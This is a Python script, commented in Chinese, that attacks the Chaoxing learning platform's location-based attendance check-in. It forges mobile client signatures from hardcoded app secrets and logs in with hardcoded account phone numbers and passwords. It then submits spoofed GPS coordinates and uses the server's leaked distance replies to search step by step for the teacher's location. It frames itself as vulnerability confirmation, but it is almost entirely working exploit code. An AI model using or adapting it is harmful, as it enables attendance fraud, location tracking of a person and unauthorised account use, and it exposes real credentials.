#!/usr/bin/env python3
"""
精确位置签到伪造 - 基于已知的郑州附近坐标进行精细搜索
已知: 教师位置约在(34.776610, 113.650040)附近，距离约1245m
"""
import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

location_aid = "5000139505593"

# 先设为缺勤
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
             data={"uids": puid_s, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
print(f"设为缺勤: {r.text[:50]}")
time.sleep(2)

def try_sign(lat, lng):
    """尝试签到并返回距离"""
    r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                 data={"activeId": location_aid, "uid": puid_s, "clientip": "",
                       "latitude": str(lat), "longitude": str(lng),
                       "appType": "15", "fid": "0"},
                 headers=ajax_hdr, timeout=10)
    text = r.text
    if "成功" in text or "已签到" in text:
        return 0, text  # 成功
    m = re.search(r'(\d+\.?\d*)\s*米', text)
    if m:
        return float(m.group(1)), text
    return -1, text

# ======================================================================
# 阶段1: 从最佳点(34.776610, 113.650040)出发，向距离减小方向搜索
# ======================================================================
print("\n" + "=" * 80)
print("[阶段1] 从最佳点出发精细搜索")
print("=" * 80)

# 已知: (34.776610, 113.650040) 距离=1245m
# 0.01度 ≈ 1.11km, 0.001度 ≈ 111m
# 需要找到距离<500m(通常签到范围)的点

best_lat = 34.776610
best_lng = 113.650040
best_dist = 1245.0

# 先确定方向 - 测试4个方向
print("\n--- 确定方向 ---")
directions = {
    "北": (best_lat + 0.01, best_lng),
    "南": (best_lat - 0.01, best_lng),
    "东": (best_lat, best_lng + 0.01),
    "西": (best_lat, best_lng - 0.01),
    "东北": (best_lat + 0.01, best_lng + 0.01),
    "西南": (best_lat - 0.01, best_lng - 0.01),
}

for name, (lat, lng) in directions.items():
    dist, text = try_sign(lat, lng)
    print(f"  {name}({lat:.4f},{lng:.4f}): 距离={dist:.0f}m, {text[:60]}")
    if dist > 0 and dist < best_dist:
        best_dist = dist
        best_lat = lat
        best_lng = lng
    time.sleep(0.3)

print(f"\n  当前最佳: ({best_lat:.6f},{best_lng:.6f}), 距离={best_dist:.0f}m")

# ======================================================================
# 阶段2: 梯度下降法精确定位
# ======================================================================
print("\n" + "=" * 80)
print("[阶段2] 梯度下降法精确定位")
print("=" * 80)

for iteration in range(8):
    step = 0.005 / (2 ** iteration)  # 逐步缩小步长
    improved = False

    for dlat in [-step, 0, step]:
        for dlng in [-step, 0, step]:
            if dlat == 0 and dlng == 0:
                continue
            test_lat = best_lat + dlat
            test_lng = best_lng + dlng
            dist, text = try_sign(test_lat, test_lng)

            if dist == 0:
                print(f"  *** 签到成功！坐标=({test_lat:.6f},{test_lng:.6f}) ***")
                print(f"  *** 位置签到伪造漏洞确认！***")
                # 恢复并退出
                r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
                             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
                             data={"uids": puid_s, "status": "1", "remark": ""},
                             headers=ajax_hdr, timeout=20)
                exit(0)

            if dist > 0 and dist < best_dist:
                best_dist = dist
                best_lat = test_lat
                best_lng = test_lng
                improved = True

            time.sleep(0.2)

    print(f"  迭代{iteration+1}: 最佳({best_lat:.6f},{best_lng:.6f}), 距离={best_dist:.0f}m, 步长={step:.6f}")

    if not improved and best_dist > 500:
        print(f"  无法进一步缩小距离，可能已达到精度极限")
        break

    if best_dist < 100:
        print(f"  距离已小于100m，尝试直接签到...")
        dist, text = try_sign(best_lat, best_lng)
        if dist == 0:
            print(f"  *** 签到成功！***")
            break

# ======================================================================
# 阶段3: 如果距离还大于阈值，尝试直接提交
# ======================================================================
print("\n" + "=" * 80)
print(f"[阶段3] 最终尝试 - 坐标({best_lat:.6f},{best_lng:.6f}), 距离={best_dist:.0f}m")
print("=" * 80)

# 尝试签到
dist, text = try_sign(best_lat, best_lng)
print(f"  签到结果: {text[:200]}")

# 也尝试带address参数
r = s_s.post(f"{BASE}/pptSign/stuSignajax",
             data={"activeId": location_aid, "uid": puid_s, "clientip": "",
                   "latitude": str(best_lat), "longitude": str(best_lng),
                   "appType": "15", "fid": "0", "address": "河南省郑州市"},
             headers=ajax_hdr, timeout=10)
print(f"  带地址: {r.text[:200]}")

# 检查最终状态
time.sleep(2)
r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": location_aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
final_status = get_status(d)
print(f"  最终状态: status={final_status}")

if final_status == 1:
    print("\n  *** 位置签到伪造成功！漏洞确认！***")
else:
    print(f"\n  位置签到伪造失败，距离={best_dist:.0f}m 可能超出签到范围阈值")
    print(f"  但信息泄露漏洞仍然存在：服务端返回了精确距离信息")

# 恢复
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": location_aid},
             data={"uids": puid_s, "status": "1", "remark": ""},
             headers=ajax_hdr, timeout=20)
print(f"\n恢复: {r.text[:50]}")

print("\n测试完成")
